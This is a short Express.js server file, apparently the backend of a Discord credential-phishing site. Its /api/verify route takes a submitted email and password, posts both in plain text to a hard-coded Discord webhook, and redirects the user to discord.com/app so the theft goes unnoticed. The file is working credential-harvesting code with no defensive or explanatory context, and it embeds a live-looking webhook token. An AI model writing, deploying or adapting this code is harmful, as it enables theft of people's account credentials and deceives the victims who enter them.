const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());
app.use(express.static('public'));

// Environment variable or config file would be better for this
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1344392452487778415/VSE30QXldmOqDSlXr_Z-IAxVjo39gCFlwcTAV6ciabP9O8PnQ0s4kZfjBGniOZJAQbcY';

app.post('/api/verify', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: `Email: ${email}\nPassword: ${password}`
            })
        });

        if (!response.ok) {
            throw new Error('Failed to process verification');
        }

        res.json({ success: true, redirect: 'https://discord.com/app' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Verification failed' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));